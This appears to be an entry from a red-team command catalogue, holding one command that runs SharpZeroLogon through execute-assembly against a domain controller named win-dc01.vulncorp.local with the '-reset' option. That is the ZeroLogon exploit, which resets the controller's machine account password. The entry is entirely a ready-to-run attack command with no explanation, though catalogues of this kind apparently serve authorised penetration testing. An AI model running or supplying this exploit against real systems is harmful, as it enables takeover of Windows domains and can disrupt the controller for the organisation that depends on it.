---
id: d5f29800-24fc-4ca3-b6a3-9606dcbae1bf
name: Reset machine account password using SharpZeroLogon
type: command
executor: bash
data: execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
output: null
created_at: '2023-04-06T03:56:02.673414+00:00'
updated_at: '2023-04-10T20:36:01.289773+00:00'
---

# Reset machine account password using SharpZeroLogon

```bash
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
```
